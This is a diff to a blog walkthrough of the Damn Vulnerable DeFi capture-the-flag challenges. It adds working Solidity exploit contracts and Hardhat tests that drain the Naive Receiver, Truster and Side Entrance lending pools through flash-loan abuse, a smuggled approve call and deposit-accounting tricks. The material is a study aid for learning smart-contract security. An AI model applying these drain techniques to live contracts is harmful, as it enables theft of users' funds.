@@ -143,7 +143,7 @@ The contract diagrams generated with the Solidity Visual Auditor extension are t
 </figure>
 
 ### Required Knowledge
-- For the bonus: [Smart Contract calling another Smart contract function](https://blog.chain.link/smart-contract-call-another-smart-contract/)
+- For the bonus: [Smart Contract Interfaces](https://cryptomarketpool.com/interface-in-solidity-smart-contracts/)
 
 ### Contracts Highlights
 The flashLoan function accepts 2 arguments, the borrower address and the borrowerAmount. 
@@ -157,6 +157,51 @@ We are going to impersonate the FlashLoanReceiver contract, by passing its addre
 The pool can perform this action 10 times, and this will drain all the receiver's funds (10ETH).
 
 There is a bonus for performing this in a single transaction. For that, we can setup a simple smart contract, that executes the 10x calls above.
+
+```
+// Interface for interacting with the Naive Receiver Lender Pool
+interface INaiveReceiverLenderPool {
+     function flashLoan(address borrower, uint256 borrowAmount) external;
+     function fixedFee() external pure returns (uint256);
+}
+
+// Exploit Contract
+contract NaiveReceiverExploit {
+    function hack(
+        INaiveReceiverLenderPool pool,
+        address payable receiver
+    ) public {
+        uint256 FIXED_FEE = pool.fixedFee();
+        while (receiver.balance >= FIXED_FEE) {
+            pool.flashLoan(receiver, 0);
+        }
+    }
+}
+```
+
+On the test code, we'll deploy our exploit contract and execute the hack.
+
+```
+it('Exploit', async function () {
+    /** CODE YOUR EXPLOIT HERE */
+
+    // Hack with a single transaction using a Smart Contract
+    const ExploitFactory = await ethers.getContractFactory('NaiveReceiverExploit', deployer);
+    this.exploit = await ExploitFactory.deploy();
+    await this.exploit.hack(this.pool.address, this.receiver.address)
+
+    // Hack with 10 transactions
+    /*
+    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+    .
+    .
+    .
+    x10
+    await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther('0'))
+    */
+
+    });
+```
 
 ## Challenge #3: Truster
 ### The Goal
@@ -195,6 +240,36 @@ For the function call, what it happens is the following:
 
 We will create a contract where we call the `flashLoan` function from the pool, and we will make use of the functionCall for approving.
 
+```
+// Interface for interacting with the Truster Lender Pool
+interface ITrusterLenderPool {
+     function flashLoan(
+        uint256 borrowAmount, 
+        address borrower, 
+        address target, 
+        bytes calldata data
+        ) external;
+}
+
+// Exploit Contract
+contract TrusterExploit {
+    function hack(
+        IERC20 token,
+        ITrusterLenderPool pool,
+        address payable hacker
+    ) public {
+        uint256 poolBalance = token.balanceOf((address(pool)));
+        bytes memory approveCalldata = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            address(this),
+            poolBalance
+            );
+        pool.flashLoan(0, hacker, address(token), approveCalldata);
+        token.transferFrom(address(pool), hacker, poolBalance);
+    }
+}
+```
+
 ## Challenge #4: Side Entrance
 ### The Goal
 The Side Entrance challenge states the following:
@@ -214,14 +289,16 @@ The contract diagram generated with the Solidity Visual Auditor extension is the
 </figure>
 
 ### Required Knowledge
-- Mapping
-- [Contract interfaces](https://medium.com/coinmonks/solidity-tutorial-all-about-interfaces-f547d2869499)
+- [Mapping in Solidity](https://www.alchemy.com/overviews/solidity-mapping)
+- [Smart Contract receiving ETH. Split between `receive` and `fallback` into separate functions](https://blog.soliditylang.org/2020/03/26/fallback-receive-split/).
 
 ### Contracts Highlights
 We have 3 functions, for depositing, withdrawing and performing a flashLoan. The contract keeps track of the balances of each user with the mapping `balances`.
 
-Analyzing the flashLoan we can see that it requires that the pool balance is greater or equal than before performing the flashloan.
-We can see that it does not check who are holding these balances...
+Analyzing the `flashLoan` function we can see that it requires that the pool balance is greater or equal than before performing the flashloan.
+
+
+We can see that it does not check who are holding these balances though...
 
 ### The Hack
 We can perfom a flashloan with all the pool balance and utilize the execute function for deposit all the amount into the pool again.
@@ -238,8 +315,59 @@ You can see how balances change on each step in the following table.
 | deposit(){value: ETHER_IN_POOL}   | 1000        | 0 | 1000 |
 | withdraw()   | 0        | 1000 | 0 |
 
+The implementation in Solidity would be:
+```
+// Interface for interacting with the Side Entrance Lender Pool
+interface ISideEntranceLenderPool {
+    function flashLoan(uint256 amount) external;
+    function deposit() external payable;
+    function withdraw() external;
+}
 
-## Challenge #4: The Rewarder
+// Exploit contract
+contract SideEntranceExploit {
+    using Address for address payable;
+    address poolAddr;
+    address hackerAddr;
+    ISideEntranceLenderPool pool;
+
+    constructor (ISideEntranceLenderPool _pool) {
+        hackerAddr = msg.sender;
+        pool = _pool;
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    function flash(uint256 amount) public {
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(hackerAddr).sendValue(amount);
+    }
+
+    receive() external payable {}
+
+}
+```
+Few highlights:
+- On the function `constructor()`, we'll be initializing the pool interface with its address, as well as grab our attacker address, for being able to pay us back, once we've drained the pool.
+- The function `execute()` is needed as it is defined in the pool contract as the interface on how to talk to external contracts (like ours). Here we perform the `deposit`action with the flashLoan amount that we have been granted, so the pool balance is the same as before performing the flashloan.
+- The function `flash()`is the one the attacker will call for initiate the attack. It will call the `flashLoan`function from the pool, and once done, it will withdraw the funds and send them to the attacker address.
+- The `receive() external payable` will allow our contract to receive ETH, needed when called the `withdraw`() function.
+
+On the test code, we'll then deploy our malicious contract and call the `flash()` function.
+```
+it('Exploit', async function () {
+    /** CODE YOUR EXPLOIT HERE */
+    const SideEntranceExploit = await ethers.getContractFactory('SideEntranceExploit', attacker);
+    this.exploit = await SideEntranceExploit.deploy(this.pool.address);
+    await this.exploit.flash(ETHER_IN_POOL);
+    });
+```
+
+
+## Challenge #5: The Rewarder
 ### The Goal
 The Rewarder challenge states the following:
 > There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You don't have any DVT tokens. Rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?
@@ -255,7 +383,7 @@ There are 4 contracts:
 
 The contract diagram fro the Rewarder Pool generated with the Solidity Visual Auditor extension is the following:
 
-<figure style="text-align:center;">
+<figure style="">
     <img src="https://raw.githubusercontent.com/seaona/blog/main/_media/damn-vulnerable-defi/rewarder-pool.png" title="Rewarder Pool" width="350"/>
     <figcaption>Rewarder Pool</figcaption>
 </figure>
